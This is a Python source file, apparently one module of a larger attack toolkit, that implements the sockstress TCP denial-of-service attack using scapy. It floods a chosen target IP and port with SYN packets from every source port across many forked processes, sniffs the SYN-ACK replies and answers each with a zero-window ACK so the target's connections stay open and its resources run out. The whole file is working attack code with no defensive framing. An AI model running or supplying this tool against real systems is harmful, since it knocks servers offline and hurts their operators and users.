from scapy.all import *
import random
import os
import argparse
import ipaddress
import common
import multiprocessing


parser = argparse.ArgumentParser(description='sockstress', formatter_class=argparse.RawTextHelpFormatter,usage="")
parser.add_argument('-s', dest="source_addr", nargs='?', type=str, help='source address', required=True)
parser.add_argument('-t', dest="target_ip", type=str, nargs='?', help='target ip', required=True)
parser.add_argument('-p', dest="target_port", type=int, nargs='?', help='target port', required=True)
parser.add_argument('--fork', dest="fork", type=int, nargs='?', help='how many process fork,default 20')
parser.add_argument('-i', dest="iface", nargs='?', type=str, help='the network interface', required=True)


if common.print_sub_help:
    parser.print_help()
    exit(0)

sockstress_args ,_= parser.parse_known_args()

source_addr = None
iface = None
target = None
port = None
fork = None
ip = None

def init():
    global iface,target,port,fork,source_addr
    source_addr=sockstress_args.source_addr
    ipaddress.IPv4Address(source_addr)
    iface = sockstress_args.iface
    target = sockstress_args.target_ip
    ipaddress.IPv4Address(target)
    port = sockstress_args.target_port
    fork = 20 if not sockstress_args.fork else sockstress_args.fork
    if fork > 50:
        print("fork must less than 50")

def handle(p):
    r = p["TCP"]
    send(ip / TCP(sport=r.dport, dport=r.sport, seq=r.ack, ack=r.seq + 1, flags="A", window=0), verbose=False)



def __sub_process(start_port,end_port):
    a = AsyncSniffer(
        filter="ip src {} and ip dst {} and tcp and  dst portrange  {}-{} and  src port {} and  tcp[13] & 2 != 0 and tcp[13] & 16 != 0".format(
            target, source_addr,start_port, end_port - 1, port),
        iface=iface, prn=handle)
    a.start()
    for j in range(start_port, end_port):
        seq = random.randrange(0, (1 << 32) - 1)
        send(ip / TCP(sport=j, dport=port, seq=seq, ack=0, flags="S"), verbose=False)

def run():
    global ip
    ip = IP(src=source_addr, dst=target)
    s = 65536 // fork
    p = []

    for i in range(fork):
        p.append([i * s, i * s + s])

    if 65536 % fork != 0:
        p.append([fork * s, 65536])

    for i in range(len(p)):
        pp = p[i]
        multiprocessing.Process(target=__sub_process,args=[pp[0],pp[1]],daemon=True).start()


